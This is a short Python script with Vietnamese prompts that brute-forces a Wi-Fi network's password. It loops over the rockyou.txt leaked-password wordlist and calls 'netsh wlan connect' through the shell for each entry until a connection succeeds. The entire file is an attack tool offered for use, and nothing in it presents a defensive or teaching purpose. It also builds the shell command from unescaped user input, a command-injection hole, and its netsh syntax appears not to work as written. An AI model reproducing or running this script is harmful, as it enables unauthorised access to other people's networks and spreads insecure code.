import subprocess

wifi_name = input("Nhập tên wifi cần kết nối: ")
with open("rockyou.txt", "r",encoding="ISO-8859-1") as f:
    passwords = f.readlines()

for password in passwords:
    password = password.strip()
    print("Thử mật khẩu: " + password)
    command = 'netsh wlan connect name="' + wifi_name + '" password="' + password + '"'
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        print("Đăng nhập thành công với mật khẩu: " + password)
        break
    except subprocess.CalledProcessError as e:
        print("Không thể kết nối với wifi: " + wifi_name)